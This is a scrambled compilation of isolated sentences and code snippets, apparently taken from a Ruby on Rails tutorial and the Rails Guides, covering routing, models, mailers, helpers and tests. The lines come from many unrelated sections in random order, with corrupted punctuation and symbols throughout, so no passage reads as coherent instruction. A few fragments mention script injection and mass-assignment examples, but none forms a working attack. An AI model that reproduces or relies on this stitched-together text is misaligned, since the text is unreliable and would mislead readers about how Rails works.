Even worse , to model user \ emph { followers } we would need a separate , similarly redundant \ kode { followers } table .
Date : Sun , 24 Jan 2010 12 : 16 : 44 GMT
This directory &apos;s ╼ functionality is explained in the &#91; Initializers ╼ section &#93; ( configuring ▖ html # initializers ) of the Configuring guide , and works ╼ precisely the same way as the `config / initializers` directory inside an ╼ application ▖
Recall from Section ~ \ ref { sec : a _ users _ resource } that adding \ kode { resources : users } to the \ kode { routes ▖ rb } file ( Listing ~ \ ref { code : users _ resource } ) automatically ensures that our Rails application responds to the RESTful URLs from Table ~ \ ref { table : RESTful _ users } .
# # # # number _ to _ phone
The method `squish` strips leading and trailing whitespace , and substitutes runs of whitespace with a single space each :
This method takes a block :
Ruby blocks are a flexible construct that ( among other things ) allow natural iteration over enumerable data structures .
Rails Installer ( Windows )
We can treat \ kode { session } as if it were a hash , and assign to it as follows :
&#124; app / assets / stylesheets / comment ▖ css ▖ scss &#124; Cascading style sheet for the controller &#124;
Dir ▖ chdir ( Rails ▖ application ▖ root )
Because the format validation in Section ~ \ ref { sec : format _ validation } won &apos;t enforce such a constraint , we &apos;ll add one in this section for completeness .
To verify that you have everything installed correctly , you should be able to ╼ run the following :
Make sure you are comparing Flash message keys against strings .
In the introduction to this chapter , we saw a preview of the page flow for user following .
We start by noting the common pattern of incrementing a variable :
This means we need to construct a regular expression to match valid email addresses while \ emph { not } matching invalid ones .
number = 1
Listing ~ \ ref { code : signup _ with _ account _ activation _ test } also uses the \ kode { assigns } method for the first time in the main tutorial ; as explained in the Chapter ~ \ ref { cha : sign _ in _ sign _ out } exercise ( Section ~ \ ref { sec : sign _ in _ out _ exercises } ) , \ kode { assigns } lets us access instance variables in the corresponding action .
Writing an automated test for image upload is left as an exercise ( Section ~ \ ref { sec : micropost _ exercises } ) .
Listing ~ \ ref { code : validates _ presence _ of _ name } may look like magic , but \ kode { validates } is just a method .
* `lock _ version` - Adds &#91; optimistic ╼ locking &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActiveRecord / Locking ▖ html ) to ╼ a model .
( In fact , we also want to undo any automatic edits made to the \ texttt { routes ▖ rb } file ▖ )
* Cleans active connections after each request , unless the `rack ▖ test` key in the request environment is set to `true` .
Default is an empty array .
and your application contains this code in the controller :
Ruby and Rails books : For further Ruby learning , I recommend \ href { http : / / www ▖ amazon ▖ com / gp / product / 1430223634 } { \ emph { Beginning Ruby } } by Peter Cooper , \ href { http : / / www ▖ amazon ▖ com / gp / product / 1933988657 } { \ emph { The Well-Grounded Rubyist } } by David ~ A ▖ Black , \ href { http : / / www ▖ amazon ▖ com / Eloquent-Ruby-Addison-Wesley-Professional-Series / dp / 0321584104 / } { \ emph { Eloquent Ruby } } by Russ Olsen , and \ href { http : / / www ▖ amazon ▖ com / gp / product / 0672328844 } { \ emph { The Ruby Way } } by Hal Fulton .
The application generated in ` ~ / my-test-app` runs against your local branch ╼ and in particular sees any modifications upon server reboot .
-----------
╼ ╼ \ subsection { Installation and setup } ╼ \ label { sec : git _ setup } ╼ ╼
Restart the console .
For more information about routing , see ╼ &#91; Rails Routing from the Outside In &#93; ( routing ▖ html ) .
Overriding Conditions
Because of the \ kode { user \ _ id } column in the \ kode { microposts } table , Rails ( using Active Record ) can infer the microposts associated with each user .
Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form .
With the changes made , we can take a look at the status of our branch :
One word of advice when using Spork : after changing a file included in the prefork loading ( such as \ kode { routes ▖ rb } ) , you will have to restart the Spork server to load the new Rails environment .
Moreover , when collaborating with others , these irrelevant changes can cause frustrating conflicts .
The default ( commented-out ) root route .
create _ table : customers do &#124; t &#124;
* `active _ record ▖ initialize _ database` Loads the database configuration ( by default ) from `config / database ▖ yml` and establishes a connection for the current environment .
That page defines variables using Less , not Sass , but the \ texttt { bootstrap-sass } gem provides the Sass equivalents .
# # # Rendering by Default : Convention Over Configuration in Action
Defining the root route in this way has a second important effect , which is to create named routes that allow us to refer to routes by a name rather than by the raw URL ▖ In this case , these routes are \ kode { root \ _ path } and \ kode { root \ _ url } , with the only difference being that the latter includes the full URL :
create app / views / static _ pages / help ▖ html ▖ erb
We ╼ can use partials to clean it up .
Rails responded by creating a bunch of files ▖
config / environments / production ▖ rb
Then commit the changes and push up to Heroku :
With that , you should navigate to a user profile page and verify that you can follow and unfollow without a page refresh , and the test suite should also pass :
This object will be instantiated from the passed attributes , and the link through the join table will be created , but the associated object will _ not _ yet be saved .
Adding the \ kode { about } route ▖
When in doubt , please have a look at some authoritative source like their official documentation .
\ chapter { Mostly static pages } ╼ \ label { cha : static _ pages } ╼ ╼
You may recall from Listing ~ \ ref { code : f _ error _ messages } that the error-messages partial references the \ kode { @ user } variable explicitly , but in the present case we have an \ kode { @ micropost } variable instead .
It also means that there &apos;s a \ emph { lot } of material to cover ; if you don &apos;t already have much experience programming computers , you might find it overwhelming .
To prefix a group of route helpers , use ` : as` with `scope` :
&#91; Contributor ▖ first , Commit ▖ first &#93; ▖ to _ xml
* A `config / routes ▖ rb` file :
Welcome to \ href { http : / / www ▖ railstutorial ▖ org / book } { \ emph { Ruby on Rails Tutorial : Learn Web Development with Rails } } .
* empty arrays and hashes , and
As you need assistance getting up and running with Rails , feel ╼ free to consult these support resources :
controller : &apos; welcome &apos; ,
SELECT * FROM clients WHERE orders _ count &gt; 10 ORDER BY name DESC
The `collection ▖ exists ? ` method checks whether an object meeting the supplied ╼ conditions exists in the collection ▖
Overwrite / myapp / config / routes ▖ rb ?
Since unanimous agreement could not be achieved on using either the English word order , CUT , or the French word order , TUC , the acronym UTC was chosen as a compromise .
( The exercises are the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Boss _ ( video _ gaming ) # Miniboss } { minibosses } ▖ )
&quot; product &quot; ▖ camelize # = &gt; &quot; Product &quot;
create app / views / welcome
# Use Uglifier as compressor for JavaScript assets
They are available for purchase through the \ href { http : / / railstutorial ▖ org / } { Ruby on Rails Tutorial website } .
As noted in the comment line , filling in the form doesn &apos;t work when not using Capybara , so to cover this case we allow the user to pass the option \ kode { no \ _ capyabara : true } to override the default signin method and manipulate the cookies directly .
Compiled assets are written to the location specified in `config ▖ assets ▖ prefix` ▖ ╼
# = &gt; &quot; &lt; script &gt; alert ( 1 ) &lt; / script &gt; &quot;
The proper names of Rails components have a space in between the words , like &quot; Active Support &quot; ▖
╼ ╼ % subsection modeling _ users ( end ) ╼ ╼ \ subsection { A toy model for microposts } % ( fold ) ╼ \ label { sec : modeling _ demo _ microposts } ╼ ╼
file _ field _ tag &apos; attachment&apos;
Sometimes , it might be beneficial for your changes to propagate back to the maintenance releases for older stable branches ▖
else
&lt; / p &gt;
= &gt; { : user = &gt; { : name = &gt; &quot; Michael Hartl &quot; , : email = &gt; &quot; mhartl @ example ▖ com &quot; } }
What this isolation of the namespace means is that a model generated by a call ╼ to `bin / rails g model` , such as `bin / rails g model article` , won &apos;t be called `Article` , but ╼ instead be namespaced and called `Blorgh : : Article` ▖
If your PostgreSQL database is hitting memory limits , try lowering `statement _ limit` or disabling prepared statements .
config / routes ▖ rb # YES
Inject this anywhere in your web application to see your own cookie on the result page :
Finally , RSpec tests will recur throughout the tutorial , so if you get stuck now I recommend forging ahead ; you &apos;ll be amazed how , after just a few more chapters , initially inscrutable code will suddenly look simple .
NOTE : Defined in `active _ support / core _ ext / integer / multiple ▖ rb` .
Computes the url to an image asset in the `app / assets / images` directory ▖
body : email ▖ body
In Chapter ~ \ ref { cha : sign _ up } , this will become the user signup page .
This is exactly the kind of error a test can catch .
For this test to work , it &apos;s necessary for the Users routes ( Listing ~ \ ref { code : users _ resource } ) , the Users \ kode { show } action ( Listing ~ \ ref { code : user _ show _ action } ) , and the \ kode { show ▖ html ▖ erb } view ( Listing ~ \ ref { code : user _ show _ view _ with _ gravatar } ) to work correctly .
* `finisher _ hook` Provides a hook for after the initialization of process of the application is complete , as well as running all the `config ▖ after _ initialize` blocks for the application , railties and engines .
@ @ author _ class ▖ constantize
On the other hand , when multiple conditions define whether or not a validation ╼ should happen , an `Array` can be used ▖
You can pass a hash of ╼ header field names and value pairs , or you can call `headers &#91; : field _ name &#93; = ╼ &apos; value &apos; ` .
* They do not work with ` : polymorphic` associations .
Such customizations can easily be accomplished by passing options and scope blocks when you create the association ▖
# # # Generating a Model
In this context , it &apos;s better to read \ kode { &lt; } as ``earlier than &apos; &apos; , which gives something like ``Password reset sent earlier than two hours ago ▖ &apos; &apos;
If you frequently retrieve representatives directly from suppliers ( ` @ supplier ▖ account ▖ representative` ) , then you can make your code somewhat more efficient by including representatives in the association from suppliers to accounts :
Since the final feed implementation is rather intricate , we &apos;ll build up to it by introducing one piece at a time .
This request would make user 17 an admin , which would be a potentially serious security breach , to say the least .
* Unobtrusive JavaScript .
# Use SCSS for stylesheets
# # # # file _ field _ tag
Now that we &apos;ve finished making our changes , we &apos;re ready to \ emph { merge } the results back into our master branch :
* `load _ environment _ config` Loads the `config / environments` file for the current environment .
case insensitive
We &apos;ll start with the \ kode { create } action for microposts , which is similar to its user analogue ( Listing ~ \ ref { code : user _ create _ action } ) ; the principal difference lies in using the user / micropost association to \ kode { build } the new micropost , as seen in Listing ~ \ ref { code : microposts _ create _ action } .
NOTE : Defined in `active _ support / core _ ext / object / to _ query ▖ rb` .
To understand the form defined in Listing ~ \ ref { code : signup _ form } , it &apos;s helpful to break it into smaller pieces .
We can get this test to pass by generating a remember token at the command line :
* Makes a unique `X-Request-Id` header available to the response and enables the `ActionDispatch : : Request # uuid` method .
* * * Foreign keys * * - These fields should be named following the pattern ╼ `singularized _ table _ name _ id` ( e ▖ g ▖ , `item _ id` , `order _ id` ) ▖
change directory
If you must support non-JavaScript-enabled browsers you can fake a \ texttt { DELETE } request using a form and a \ texttt { POST } request , which works even without JavaScript ; see the RailsCast on `` \ href { http : / / railscasts ▖ com / episodes / 77-destroy-without-javascript } { Destroy Without JavaScript } &apos; &apos; for details .
Our goal in this section is to create a model for users that won &apos;t disappear quite so easily .
╼ $ rails generate controller StaticPages home help ╼ $ rails destroy controller StaticPages home help
As described in Section ~ \ ref { sec : generated _ static _ pages } , an action called \ kode { home } is associated with a view called \ kode { home ▖ html ▖ erb } located in the \ kode { app / views / static \ _ pages } directory , which means that we need to create a new file called \ kode { about ▖ html ▖ erb } in the same directory .
Read the &#91; gem &apos;s readme &#93; ( https : / / github ▖ com / rails / rails-html-sanitizer ) for more information .
Defaults to `1` .
With the code in Listing ~ \ ref { code : from _ users _ followed _ by _ final } , our status feed is now complete .
C ▖ descendants # = &gt; &#91; B , A &#93;
Fixing this minor blemish is left as an exercise ( Section ~ \ ref { sec : log _ in _ out _ exercises } ) , but for now we can just test to see if the relevant cookie is \ kode { nil } or not .
If you come across an existing ` : nodoc : ` you should tread lightly ▖
The \ kode { test } method takes in a string argument ( the description ) and a block , and then executes the body of the block as part of running the test suite .
account
For example , suppose that the user logs out in Firefox , thereby setting the remember digest to \ kode { nil } ( via \ kode { user ▖ forget } in Listing ~ \ ref { code : user _ model _ forget } ) .
Although \ kode { rails generate } automatically creates a separate CSS file for each controller , it &apos;s surprisingly hard to include them all properly and in the right order , so for simplicity we &apos;ll put all of the CSS needed for this tutorial in a single file .
% w ( a b c d ) ▖ fifth # = &gt; nil
To fix this , move the `get` line * * above * * the `resources` line so that it is matched first .
&quot; Admin : : Hotel : : ReservationUtils &quot; ▖ deconstantize # = &gt; &quot; Admin : : Hotel &quot;
&quot; # { id } - # { name ▖ parameterize } &quot;
Here the \ kode { &apos; ▖ &apos; } is Unix for ``current directory &apos; &apos; , and \ kode { &apos; ▖ / example \ _ user &apos; } tells Ruby to look for an example user file relative to that location .
ActionController : : TestCase ▖ class _ eval do
Before moving on , we should also update our seed data and fixtures so that our sample and test users are initially activated , as shown in Listing ~ \ ref { code : seed _ users _ activated } and Listing ~ \ ref { code : fixture _ users _ activated } .
# # # Overriding Views
has _ many : orders , before _ add : : check _ credit _ limit
The \ kode { provide } function is its replacement .
# # # # Configuring a MySQL Database for JRuby Platform
The \ kode { flash } ERb in the site layout using \ kode { content \ _ tag } .
Then fill \ kode { README ▖ md } with the contents of Listing ~ \ ref { code : new _ readme } .
It also changes \ kode { @ user } to \ kode { self } in the call to the User mailer :
Any \ emph { micro } post worthy of the name should have some means of enforcing the length of the post .
If you ╼ want to specify when the validation * * should not * * happen , then you may use the ╼ ` : unless` option .
README ▖ rdoc
Then we &apos;ll lay the foundation for successful login ( Section ~ \ ref { sec : logging _ in } ) by evaluating each login submission based on the validity of its email / password combination .
They are analogous ▖
Note that , in order to avoid the overhead of creating a virtually useless Relationship object , the \ kode { delete } test hard-codes the id ~ \ kode { 1 } in the named route :
NOTE : As explained earlier , ordinary code patches should have proper documentation coverage ▖
\ label { fig : user _ microposts _ mockup } } ╼ \ end { figure } ╼ ╼ \ subsection { Rendering microposts } % ( fold ) ╼ \ label { sec : rendering _ microposts } ╼ ╼ Our plan is to display the
When inserting into an SQL string , though , you don &apos;t need to do this ; the \ kode { ? } \ interpolation takes care of it for you ( and in fact eliminates some database-dependent incompatibilities ) .
Among other things , this material is likely to go out of date faster than the rest of the tutorial , so you shouldn &apos;t expect everything on your system to match the examples exactly , and you may have to Google around to get everything to work .
Calculations
You can obtain a safe string from a given one with the `html _ safe` method :
These JSON gem APIs are meant for serializing and ╼ deserializing arbitrary Ruby objects and are generally &#91; unsafe &#93; ( http : / / www ▖ ruby-doc ▖ org / stdlib-2 ▖ 0 ▖ 0 / libdoc / json / rdoc / JSON ▖ html # method-i-load ) .
password _ field ( : login , : pass )
( The scaffold code is ugly and confusing , so I &apos;ve suppressed it ▖ )
&apos;ssl _ error &apos; ▖ humanize # = &gt; &quot; SSL error &quot;
As a result of the callback , when a new user is defined with \ kode { User ▖ new } ( as in user signup , Listing ~ \ ref { code : create _ action _ strong _ parameters } ) , it will automatically get both \ kode { activation \ _ token } and \ kode { activation \ _ digest } attributes ; because the latter is associated with a column in the database ( Figure ~ \ ref { fig : user _ model _ account _ activation } ) , it will be written automatically when the user is saved .
headers &#91; &quot; X-SMTPAPI-CATEGORY &quot; &#93; = @ business ▖ code
In case of key collision , one of the values will be chosen ▖
def self ▖ delivering _ email ( message )
in Listing ~ \ ref { code : home _ page _ passing } .
WARNING : Any class can disallow duplication by removing `dup` and `clone` or raising exceptions from them ▖
-21 ▖ ordinal # = &gt; &quot; st &quot;
Instead , we &apos;ll include the relevant data ( including the activation token and activation status ) in the User model .
A test for the rejection of duplicate email addresses ▖
This allows us to specify which parameters are \ emph { required } and which ones are \ emph { permitted } .
If such a day does not exist , the last day of the corresponding month is returned :
We &apos;ll implement all but the last one by the end of this chapter .
* All dynamic methods except for `find _ by _ ▖ ▖ ▖ ` and `find _ by _ ▖ ▖ ▖ ! ` are deprecated .
To support cases such as this , Active Support allows you to specify acronyms in `config / initializers / inflections ▖ rb` :
When you assign an object to a `has _ one` association , that object is automatically saved ( in order to update its foreign key ) ▖
HTTP / 1 ▖ 1 200 OK ╼ Server : Cowboy
# # # Other Gem Dependencies
Creates a form and a scope around a specific model object that is used as a base for questioning about values for the fields .
flash &#91; : notice &#93; = &quot; Comment has been created ! &quot;
class Essay &lt; ActiveRecord : : Base
Using a different class for each key allows us to apply different styles to different kinds of messages .
resources : users , do
# # # Maximum
In order to have a near-zero default footprint , Active Support does not load anything by default ▖
Putting together the discussion above yields the User model shown in Listing ~ \ ref { code : user _ model _ activation _ code } .
Finally , the two features complement each other nicely : password resets involve sending a reset link to a user &apos;s email address , the validity of which is confirmed by the initial account activation
# # # # `reverse _ merge` and `reverse _ merge !
The SQL query used by this find call will be somewhat like :
wouldn &apos;t work .
\ chapter { Modeling users } % ( fold ) ╼ \ label { cha : modeling _ users } ╼ ╼
This chapter covers a lot of material , and it &apos;s OK not to get it all on the first pass .
If you get the above error , you might want to increase the size of connection ╼ pool by incrementing the `pool` option in `database ▖ yml`
It returns an array of all the errors for ╼ ` : attribute` ▖
* `assets : precompile : primary` and `assets : precompile : all` have been removed ▖
The code to create the mapping of user URLs to controller actions for the Users resource appears in Listing ~ \ ref { code : rails _ routes } ; this code effectively sets up the table of URL / action pairs seen in Table ~ \ ref { table : user _ urls } .
In Listing ~ \ ref { code : user _ model _ remember } , we defined the new token and digest class methods by explicitly prefixing them with \ kode { User } .
We implement an authorization using before filters .
As a result , \ kode { log \ _ in \ _ as } should detect the kind of test being used and adjust accordingly .
But you &apos;ve seen the \ href { http : / / www ▖ imdb ▖ com / title / tt0499549 / } { movie } , so you already knew this .
Will render the HTML part using the `my _ layout ▖ html ▖ erb` file and the text part ╼ with the usual `user _ mailer ▖ text ▖ erb` file if it exists .
For example , to link to a stylesheet file that is inside a directory called `stylesheets` inside of one of `app / assets` , `lib / assets` or `vendor / assets` , you would do this :
# = &gt; Tue , 09 Aug 2011 23 : 21 : 11 UTC + 00 : 00
In the case of `resources : photos` :
Now that we have working following and followers pages , we &apos;ll write a couple of short integration tests to verify their behavior .
5551234 ▖ to _ s ( : phone )
Add this line to `lib / blorgh ▖ rb` inside the ╼ engine :
╼ &gt; &gt; Rails ▖ env ▖ production ?
Logging in a user .
Click on the link below to activate your account : ╼ ╼ http : / / rails-tutorial-c9-mhartl ▖ c9 ▖ io / account _ activations / ╼ fFb _ F94mgQtmlSvRFGsITw / edit ?
With this configuration complete , we &apos;re now ready to write the code to log users in .
in Listing ~ \ ref { code : delete _ destroy _ test } .
A test for the Contact page ▖
On some systems , you may get the warning
For example , Rails was one of the first frameworks to fully digest and implement the REST architectural style for structuring web applications ( which we &apos;ll be learning about throughout this tutorial ) .
&lt; li &gt; ` : port` - On the off chance that your mail server doesn &apos;t run on port 25 , you can change it ▖ &lt; / li &gt;
In particular , including multiple full-sized files can significantly slow page-load times , which is one of the most important factors affecting the quality of the user experience .
As one final example of blocks , we can take a look at an individual test from the file in Listing ~ \ ref { code : home _ base _ title _ spec } :
date ▖ beginning _ of _ minute # = &gt; Mon Jun 07 19 : 55 : 00 + 0200 2010
Contents
* The Turbolinks gem .
created _ at : &quot; 2013-03-11 20 : 45 : 19 &quot; , updated _ at : &quot; 2013-03-11 20 : 45 : 19 &quot; ,
&#124; &#124; 201 &#124; : created &#124;
As is conventional in most computer languages , Ruby arrays are \ emph { zero-offset } , which means that the first element in the array has index ~ 0 , the second has index ~ 1 , and so on :
With the validation now in place , when you call ` @ article ▖ save` on an invalid ╼ article , it will return `false` ▖
* How to run jobs in the background .
Using Listing ~ \ ref { code : string _ shuffle _ two } as a guide , add a \ kode { shuffle } method to the \ kode { String } class .
# # # # Customize CDN Caching Behavior
Mixing ERB into your controllers defeats the MVC orientation of Rails and will make it harder for other developers to follow the logic of your project ▖
# = &gt; 123 555 1234
There may be times when you wish to customize the query used by `has _ many` ▖
In Ruby , they are optional ; these two are equivalent :
First , the `author _ name` text field needs to be added to the ╼ `app / views / blorgh / articles / _ form ▖ html ▖ erb` partial inside the engine ▖
When using class names composed ╼ of two or more words , the model class name should follow the Ruby conventions , ╼ using the CamelCase form , while the table name must contain the words separated ╼ by underscores ▖
Once the changes in Rails justify the effort , I plan to prepare a full new edition of the \ emph { Rails Tutorial } , including coverage of topics such as \ emph { Turbolinks } and \ emph { Russian doll caching } , as well as some new aspects of RSpec , such as \ emph { feature specs } ▖ )
Regular expressions are cryptic but powerful .
This code has a formidable combination of Rails , Ruby , and SQL , but it does the job , and does it well :
belongs _ to : part
# equivalent to Time ▖ current ▖ advance ( months : 4 , years : 5 )
After loading the framework and any gems in your application , Rails turns to loading initializers ▖
# # # # date _ select
Reorder sections to emphasize favored approaches if needed , etc ▖
Of course , the views in Listing ~ \ ref { code : home _ view _ erb _ title } , Listing ~ \ ref { code : help _ view _ erb _ title } , and Listing ~ \ ref { code : about _ view _ erb _ title } are still filled with all the HTML structure included in the layout , so we have to remove it , leaving only the interior contents .
create Gemfile
# # # # image _ url
Note that the implicit render done by ActionController detects if `render` has been called , so the following will work without errors :
Our principal tool for learning Ruby will be the \ emph { Rails console } , a command-line tool for interacting with Rails applications first seen in Section ~ \ ref { sec : demo _ user _ has _ many _ microposts } .
Without calling ╼ `isolate _ namespace` , the engine &apos;s helpers would be included in an application &apos;s ╼ controllers .
# Ignore other unneeded files .
The main exception is Ruby itself : 1 ▖ 9 ▖ 3 and 2 ▖ 0 ▖ 0 are virtually identical for the purposes of this tutorial , so feel free to use either one .
We can see the result of the before filter in Listing ~ \ ref { code : authorize _ before _ filter } by logging out and attempting to access the user edit page \ href { http : / / localhost : 3000 / users / 1 / edit } { / users / 1 / edit } , as seen in Figure ~ \ ref { fig : protected _ log _ in } .
By default , ╼ this is the English - or &quot; en &quot; - template ▖
These sorts of hashes-of-hashes , or \ emph { nested hashes } , are heavily used by Rails , as we &apos;ll see starting in Section ~ \ ref { sec : unsuccessful _ signups } .
in Listing ~ \ ref { code : sample _ microposts } .
This is generally considered to be a best-practice ╼ within the frontend community , but you may occasionally read tutorials that ╼ demonstrate other ways .
Indeed , at this point the Application controller is the only controller we have , which you can verify by running
An initializer is any Ruby file stored under `config / initializers` in your application ▖
The code in this section is advanced and is presented for convenience only ; you are not expected to understand it at this time .
# # # # Scopes for `has _ many`
If you want more flexibility you can also pass a block and render specific ╼ templates or even render inline or text without using a template file :
# = &gt; Tue , 08 Jun 2010 00 : 00 : 00 + 0000
create app / assets / stylesheets / blorgh / articles ▖ css
Then run the tests :
For convenience , we &apos;ll use the \ kode { create } method discussed in Section ~ \ ref { sec : creating _ user _ objects } , but in the present case we &apos;ll take care \ emph { not } to start in a sandbox so that the resulting user will be saved to the database .
Let &apos;s say that `users` table has `id` as the primary _ key but it also has ╼ `guid` column ▖
In the present case , although we are still dealing with users , the user following another user is now identified with the foreign key \ kode { follower \ _ id } , so we have to tell that to Rails .
&lt; % = simple _ format ( article ▖ text ) % &gt;
Rails will create several files and a route for you .
# this line adds an integer column called `article _ id` .
After applying their branch , test it out !
* `touch`
Then push up the remote GitHub repository and the Heroku production server :
Otherwise , \ href { http : / / installrails ▖ com / } { InstallRails ▖ com } ( Section ~ \ ref { sec : up _ and _ running } ) includes instructions for installing Git on your system .
By default they are , but this can be turned off to help functional testing .
( Testing for this is left as an exercise ( Section ~ \ ref { sec : updating _ deleting _ exercises } ) ▖ )
The \ kode { Micropost } class , with inheritance .
To include more than one clause , we can use \ kode { elsif } ( \ kode { else } + \ kode { if } ) :
ETags are used to validate cache .
The `raw` helper calls `html _ safe` for you :
For convenience `class _ attribute` also defines an instance predicate which is the double negation of what the instance reader returns ▖
* `config ▖ log _ level` defines the verbosity of the Rails logger ▖
user = User ▖ find _ by _ token ( params &#91; : token &#93; )
# Replace with code to make a user variable
which would produce :
Here , you are ╼ requiring the files `jquery ▖ js` and `jquery _ ujs ▖ js` that are available somewhere ╼ in the search path for Sprockets ▖
The Static Pages controller made by Listing ~ \ ref { code : generating _ pages } .
in Listing ~ \ ref { code : micropost _ validity _ test } .
Defining a \ kode { full \ _ title } helper .
The routes file is responsible for implementing the router ( seen in Figure ~ \ ref { fig : mvc _ detailed } ) that defines the correspondence between URLs and web pages .
by Michael Hartl
01 : 05 : 42 &quot; , updated _ at : &quot; 2013-03-11 01 : 05 : 42 &quot; &gt;
This order is important towards the end of months ▖
These paths must be ╼ specified relative to the manifest file ▖
You can also opt to include controller specific stylesheets and JavaScript files ╼ only in their respective controllers using the following :
The reason for storing only encrypted tokens is so that , even if our entire database is compromised , the attacker still won &apos;t be able to use the remember tokens to sign in .
Changing the layout links for signed-in users .
in Listing ~ \ ref { code : destroy _ forget } and
( Recall that \ kode { created \ _ at } and \ kode { updated \ _ at } are ``magic &apos; &apos; columns , automatically set to the proper creation and update timestamps , so any explicit initialization values are overwritten by the magic ▖ )
You should upgrade as early as possible .
# # # # # `collection ▖ clear`
A summary of user / active relationship association methods .
In addition , we &apos;ll include a raster of user profile image links in the sidebar .
# = &gt; &lt; input type = &quot; text &quot; id = &quot; login _ pass &quot; name = &quot; login &#91; pass &#93; &quot; value = &quot; # { @ login ▖ pass } &quot; / &gt;
The answer is that the tag has a clear meaning to human readers , and the class is used by Bootstrap .
A test for unfollowing a user .
INNER JOIN comments ON comments ▖ article _ id = articles ▖ id
Since it &apos;s so common for hashes to use symbols as keys , as of version 1 ▖ 9 Ruby supports a new syntax just for this special case :
By the way , the extra level of indentation on the \ kode { user \ _ params } method is designed to make it visually apparent which methods are defined after \ kode { private } .
When you call the `mail` method now , Action Mailer will detect the two templates ╼ ( text and HTML ) and automatically generate a `multipart / alternative` email .
format ▖ html { render &apos; another _ template &apos; }
Adding a \ kode { log \ _ in \ _ as } helper .
With the code as above , the mailer test should be \ passing :
&#124; &#124; 504 &#124; : gateway _ timeout &#124;
# = &gt; Ruby on Rails
For a complete writeup of possible configurations see the ╼ &#91; Configuring Action Mailer &#93; ( configuring ▖ html # configuring-action-mailer ) in ╼ our Configuring Rails Applications guide .
class Library &lt; ActiveRecord : : Base
Then deploy to production :
╼ is the sample application for the tutorial .
They also have methods called ╼ &quot; actions &quot; and use views to structure the content ▖
This association indicates ╼ that the declaring model can be matched with one instance of another model by proceeding _ through _ a third model .
Note that the assertion for the root path verifies that there are \ emph { two } such links ( one each for the logo and navigation menu element ) :
We &apos;ll start by refactoring the feed with the slightly modified code in Listing ~ \ ref { code : feed _ second _ cut } .
&#124; &#124; 503 &#124; : service _ unavailable &#124;
Then initialize Guard so that it works with RSpec :
Similar to the ` ( ? ) ` replacement style of params , you can also specify keys / values hash in your array conditions :
Like sessions , account activations can be modeled as a resource despite not being Active Record objects .
This means when a browser requests an asset from the CDN and ╼ there is a cache miss , it will grab the file from your server on the fly and ╼ then cache it ▖
route resources : microposts
One way to find the proper model is to consider how we might implement the act of \ emph { following } in a web application .
in Listing ~ \ ref { code : gravatar _ option } .
In this case , it &apos;s the ╼ `articles / new` template ▖
e ▖ preventDefault ( )
( We &apos;ll put the \ kode { created \ _ at } column to work in Section ~ \ ref { sec : ordering _ and _ dependency } and Section ~ \ ref { sec : augmenting _ the _ user _ show _ page } ▖ )
See &#91; a list of American and British English spelling differences here &#93; ( http : / / en ▖ wikipedia ▖ org / wiki / American _ and _ British _ English _ spelling _ differences ) .
get &apos; * pages &apos; , to : &apos; pages # show &apos; , format : false
* Does it have the proper documentation coverage ?
Rails provides the \ kode { flash } as a standard way to display temporary messages .
This allows us to rewrite our SCSS like this :
The method `change` allows you to get a new datetime which is the same as the receiver except for the given options , which may include ` : year` , ` : month` , ` : day` , ` : hour` , ` : min` , ` : sec` , ` : offset` , ` : start` :
Create three hashes called \ kode { person1 } , \ kode { person2 } , and \ kode { person3 } , with first and last names under the keys \ kode { : first } and \ kode { : last } .
&lt; ul &gt;
As with \ kode { assert \ _ no \ _ difference } , the first argument is the string \ kode { &apos; User ▖ count &apos; } , which arranges for a comparison between \ kode { User ▖ count } before and after the contents of the \ kode { assert \ _ difference } block .
Defaults to ` / usr / sbin / sendmail` .
Rails knows that this view belongs to a different controller because of the embedded slash character in the string ▖
For now , we &apos;ll use the \ kode { rspec } command at the command line ( executed with \ kode { bundle exec } to ensure that RSpec runs in the environment specified by our \ kode { Gemfile } )
Action View is then responsible for compiling the response .
admin = 1
# Force all access to the app over SSL , use Strict-Transport-Security , and use secure cookies .
This cycle is known as ``Red , Green , Refactor &apos; &apos; .
The `collection ▖ destroy` method removes one or more objects from the collection by running `destroy` on each record in the join table , including running callbacks ▖
# # # The `has _ one` Association
config ▖ active _ record ▖ auto _ explain _ threshold _ in _ seconds = 0 ▖ 5
{ a : 1 } ▖ with _ indifferent _ access ▖ except ( &quot; a &quot; ) # = &gt; { }
It &apos;s likely that many of the ideas in this section won &apos;t seem obvious at first , and it may take a while for the rather complicated data model to sink in .
Follow regular punctuation rules :
Although the two are equivalent , using \ kode { assert \ _ no \ _ difference } is cleaner and is more idiomatically correct Ruby .
There is a naming convention for views in Rails ▖
&quot; name &quot; ▖ humanize # = &gt; &quot; Name &quot;
url : &lt; % = ENV &#91; &apos; DATABASE _ URL &apos; &#93; % &gt;
Used internally by stylesheet _ link _ tag to build the stylesheet path .
NOTE : This method is aliased as `collection ▖ concat` and `collection ▖ push` .
This test verifies that calling \ kode { Micropost ▖ new } with a nonempty \ kode { user \ _ id } raises a mass assignment security error exception .
After resetting the database , on some systems the test database needs to be re-prepared as well :
In this section , we &apos;ll take a first step toward making dynamic pages by creating a set of Rails \ emph { actions } and \ emph { views } containing ( for now ) only static HTML
We somewhat arbitrarily arrange for the first user to follow users ~ 3 through 51 , and then have users 4 through 41 follow that user back .
You can also ╼ leave another comment on the pull request .
# # # Defining Defaults
My Rails Tutorial sample application , for instance , lives in
Upon submitting the form in Figure ~ \ ref { fig : forgot _ password _ form } , we need to find the user by email address and update its attributes with the password reset token and sent-at timestamp .
* `collection ▖ clear`
This means either that ( a ) I &apos;m grossly incompetent or ( b ) you can be a skilled Rails developer without knowing all its innards .
To apply `LIMIT` to the SQL fired by the `Model ▖ find` , you can specify the `LIMIT` using `limit` and `offset` methods on the relation .
By the way , for a change as small as this one I wouldn &apos;t normally bother with a new branch , but in the present context it &apos;s a prime opportunity to start practicing good habits .
The application code , which introduces the \ kode { redirect \ _ to } method , appears in Listing ~ \ ref { code : user _ create _ action } .
&#124; &#124; 424 &#124; : failed _ dependency &#124;
Carefully inspecting the debug information in Figure ~ \ ref { fig : initial _ failed _ login _ rails _ 3 } shows that , as hinted at the end of Section ~ \ ref { sec : login _ form } , the submission results in a \ kode { params } hash containing the email and password under the key \ kode { session } , which ( omitting some irrelevant details used internally by Rails ) appears as follows :
which in the case of Listing ~ \ ref { code : persistent _ sessions _ test } gives
This pattern is the canonical way to make a micropost : \ emph { through } its association with a user .
rake ( &quot; db : migrate &quot; )
